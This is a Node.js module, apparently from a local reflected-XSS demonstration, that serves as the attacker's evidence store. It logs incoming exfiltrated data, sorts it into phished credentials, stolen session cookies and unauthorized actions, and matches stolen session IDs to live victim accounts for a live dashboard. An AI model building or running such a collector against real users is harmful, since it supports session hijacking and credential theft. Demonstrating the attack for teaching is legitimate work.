/**
 * Central Evidence Store for Reflected XSS Exfiltration Artifacts.
 * Provides:
 *   - Real-time Event Broadcaster (Server-Sent Events) for Attacker Dashboard
 *   - File persistence (data/exfiltration_log.json)
 *   - Automated parsing & dynamic session correlation (No hardcoded values)
 *   - Cross-process synchronization via file watching (critical for multi-process runner)
 */
const fs = require('fs');
const path = require('path');
const { EventEmitter } = require('events');
const { getSession } = require('./session');

const DATA_DIR = path.join(__dirname, '../../data');
const DATA_FILE = path.join(DATA_DIR, 'exfiltration_log.json');
const emitter = new EventEmitter();

// Ensure data directory exists
try {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
} catch (err) {}

let EXFILTRATION_LOG = [];
let lastKnownMtime = 0;
let lastKnownSize = 0;

function loadFromDisk() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch (err) {}
  return [];
}

EXFILTRATION_LOG = loadFromDisk();
try {
  const stat = fs.statSync(DATA_FILE);
  lastKnownMtime = stat.mtimeMs;
  lastKnownSize = stat.size;
} catch (err) {}

function persist() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    fs.writeFileSync(DATA_FILE, JSON.stringify(EXFILTRATION_LOG, null, 2), 'utf8');
    // Update our tracking so we don't react to our own write
    try {
      const stat = fs.statSync(DATA_FILE);
      lastKnownMtime = stat.mtimeMs;
      lastKnownSize = stat.size;
    } catch (e) {}
  } catch (err) {}
}

/**
 * Cross-process file-watch synchronization.
 * When another process writes to the shared JSON file, we detect it and emit events
 * so the SSE stream on port 5002 picks up logs written by port 5000's /log endpoint.
 */
function startFileWatcher() {
  // Poll the file every 500ms for changes from other processes
  setInterval(() => {
    try {
      if (!fs.existsSync(DATA_FILE)) return;
      const stat = fs.statSync(DATA_FILE);
      
      // Only react if the file was modified by another process
      if (stat.mtimeMs > lastKnownMtime || stat.size !== lastKnownSize) {
        lastKnownMtime = stat.mtimeMs;
        lastKnownSize = stat.size;

        const freshData = loadFromDisk();
        if (!Array.isArray(freshData)) return;

        // Find new records that we don't have yet
        const existingIds = new Set(EXFILTRATION_LOG.map(r => r.id));
        const newRecords = freshData.filter(r => !existingIds.has(r.id));

        if (newRecords.length > 0) {
          EXFILTRATION_LOG = freshData;
          // Emit events for each new record so SSE clients get notified
          newRecords.forEach(record => {
            emitter.emit('new_log', record);
          });
        } else if (freshData.length < EXFILTRATION_LOG.length) {
          // Store was cleared by another process
          EXFILTRATION_LOG = freshData;
          if (freshData.length === 0) {
            emitter.emit('cleared');
          }
        }
      }
    } catch (err) {}
  }, 500);
}

// Start watching immediately
startFileWatcher();

/**
 * Inspect exfiltrated data string dynamically without hardcoded assumptions.
 */
function parsePayloadData(dataStr) {
  if (!dataStr) {
    return {
      category: 'EMPTY',
      summary: 'Empty ping received',
      details: {}
    };
  }

  // 0. Classic Alert PoC (Vector 0)
  if (dataStr.startsWith('POC_ALERT_TRIGGERED:')) {
    const origin = dataStr.slice('POC_ALERT_TRIGGERED:'.length).trim();
    return {
      category: 'POC_ALERT',
      summary: `Classic alert() popup executed on origin: ${origin || 'victim origin'}`,
      details: { origin: origin || 'unknown', raw: dataStr }
    };
  }

  // 1. Phishing credentials (Vector B)
  if (dataStr.startsWith('PHISH_CREDS:')) {
    const jsonStr = dataStr.slice('PHISH_CREDS:'.length);
    try {
      const creds = JSON.parse(jsonStr);
      return {
        category: 'CREDENTIALS',
        summary: `Harvested credentials for user "${creds.user || creds.username || 'unknown'}"`,
        details: creds
      };
    } catch {
      return {
        category: 'CREDENTIALS',
        summary: 'Harvested credentials (raw format)',
        details: { raw: jsonStr }
      };
    }
  }

  // 2. Unauthorized action execution (Vector C)
  if (dataStr.startsWith('ACTION_EXECUTED:') || dataStr.includes('email=attacker') || dataStr.includes('Settings updated')) {
    return {
      category: 'UNAUTHORIZED_ACTION',
      summary: 'Unauthorized background action executed (Silent Account Modification)',
      details: { raw: dataStr }
    };
  }

  // 3. Dynamic Session Cookie exfiltration (Vector A)
  if (dataStr.includes('sessionid=')) {
    const match = dataStr.match(/(?:^|;\s*)sessionid=([^;]+)/);
    const sessionid = match ? match[1].trim() : null;

    // Dynamically correlate with active server sessions
    const activeSession = sessionid ? getSession(sessionid) : null;
    let summary = sessionid ? `Stolen session token: sessionid=${sessionid}` : 'Exfiltrated session cookie';

    const details = {
      sessionid,
      rawCookie: dataStr
    };

    if (activeSession) {
      summary = `Stolen session token: sessionid=${sessionid.slice(0, 8)}... (${activeSession.username}, Balance: ${activeSession.balance})`;
      details.victimUser = activeSession.username;
      details.victimBalance = activeSession.balance;
      details.victimEmail = activeSession.email;
      details.accountNumber = activeSession.accountNumber;
    }

    return {
      category: 'SESSION_COOKIE',
      summary,
      details
    };
  }

  // 4. Generic Exfiltration
  return {
    category: 'GENERIC_EXFILTRATION',
    summary: `Exfiltrated payload (${dataStr.length} bytes)`,
    details: { raw: dataStr }
  };
}

/**
 * Record an exfiltrated artifact.
 */
function push(data, meta = {}) {
  // Always synchronize with fresh disk data first to prevent cross-process overwrites
  const freshFromDisk = loadFromDisk();
  EXFILTRATION_LOG = freshFromDisk;

  let rawData = '';
  let clientMeta = { ...meta };

  if (typeof data === 'object' && data !== null && !Array.isArray(data)) {
    rawData = data.data || data.raw || JSON.stringify(data);
    clientMeta = { ...clientMeta, ...data };
  } else {
    rawData = String(data || '');
  }

  const analysis = parsePayloadData(rawData);
  const now = new Date();
  const nowMs = now.getTime();

  // Deduplication: Ignore identical payload arriving within 3.5 seconds
  // (Prevents duplicate entries when victim browser fires multiple beacons or retries)
  const isDuplicate = EXFILTRATION_LOG.slice(0, 10).some(r => {
    if (r.data === rawData) {
      const recordTime = new Date(r.at).getTime();
      return (nowMs - recordTime) < 3500;
    }
    return false;
  });

  if (isDuplicate) {
    const existing = EXFILTRATION_LOG.find(r => r.data === rawData) || EXFILTRATION_LOG[0];
    return existing;
  }

  const record = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
    at: now.toISOString(),
    formattedTime: now.toLocaleTimeString(),
    data: rawData,
    category: analysis.category,
    summary: analysis.summary,
    details: analysis.details,
    ip: clientMeta.ip || '127.0.0.1',
    userAgent: clientMeta.userAgent || '(browser)',
    source: clientMeta.source || 'victim-browser',
    origin: clientMeta.origin || 'target-origin'
  };

  EXFILTRATION_LOG.unshift(record);
  persist();

  emitter.emit('new_log', record);
  return record;
}

function all() {
  const disk = loadFromDisk();
  if (disk.length !== EXFILTRATION_LOG.length) {
    EXFILTRATION_LOG = disk;
  }
  return EXFILTRATION_LOG;
}

function count() {
  return EXFILTRATION_LOG.length;
}

function clear() {
  EXFILTRATION_LOG = [];
  persist();
  emitter.emit('cleared');
}

function onNewLog(callback) {
  emitter.on('new_log', callback);
  return () => emitter.removeListener('new_log', callback);
}

function onClear(callback) {
  emitter.on('cleared', callback);
  return () => emitter.removeListener('cleared', callback);
}

module.exports = {
  push,
  all,
  count,
  clear,
  onNewLog,
  onClear,
  parsePayloadData
};
